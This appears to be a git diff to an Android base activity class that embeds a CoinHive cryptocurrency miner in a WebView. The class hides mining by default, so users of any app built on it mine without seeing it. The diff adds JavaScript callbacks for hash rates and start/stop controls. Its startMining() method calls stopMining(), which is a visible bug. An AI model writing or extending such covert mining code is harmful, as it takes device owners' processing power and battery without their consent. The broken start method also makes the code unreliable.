@@ -16,11 +16,13 @@ import android.widget.LinearLayout;
 public class BaseCoinHiveActivity extends AppCompatActivity {
 
 
+    private WebView wvCoinHive;
+
     @Override
     public void setContentView(@LayoutRes int layoutResID) {
         super.setContentView(layoutResID);
 
-        final WebView wvCoinHive = new WebView(this);
+        wvCoinHive = new WebView(this);
         wvCoinHive.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
         wvCoinHive.getSettings().setJavaScriptEnabled(true);
         wvCoinHive.loadUrl(CoinHive.generateURL());
@@ -28,7 +30,6 @@ public class BaseCoinHiveActivity extends AppCompatActivity {
         wvCoinHive.setWebViewClient(new WebViewClient() {
 
         });
-        System.out.println("Mining started");
 
         ((ViewGroup) getWindow().getDecorView().findViewById(android.R.id.content)).addView(wvCoinHive);
         if (isHideMining()) {
@@ -37,21 +38,58 @@ public class BaseCoinHiveActivity extends AppCompatActivity {
     }
 
     @JavascriptInterface
-    public void onStatus(double hashesPerSecond, long totalHashes, long acceptedHashes) {
+    public void onMiningStartedJS() {
+        onMiningStarted();
+    }
+
+    @JavascriptInterface
+    public void onMiningStoppedJS() {
+        onMiningStopped();
+    }
+
+
+    public void stopMining() {
+        wvCoinHive.loadUrl("javascript:stopMining()");
+    }
+
+    public void startMining() {
+        wvCoinHive.loadUrl("javascript:stopMining()");
+    }
+
+
+    @JavascriptInterface
+    public void onRunningJS(double hashesPerSecond, long totalHashes, long acceptedHashes) {
         if (CoinHive.getInstance().isLoggingEnabled()) {
             System.out.println("Hashes/second:" + hashesPerSecond);
             System.out.println("Total hashes:" + totalHashes);
             System.out.println("Accepted hashes:" + acceptedHashes);
         }
 
+        onRunning(hashesPerSecond, totalHashes, acceptedHashes);
     }
 
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        System.out.println("Mining stopped");
+        if (CoinHive.getInstance().isLoggingEnabled()) {
+            System.out.println("Mining stopped");
+        }
+        onMiningStopped();
     }
+
+    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {
+
+    }
+
+    private void onMiningStopped() {
+
+    }
+
+    private void onMiningStarted() {
+
+    }
+
 
     public boolean isHideMining() {
         return true;
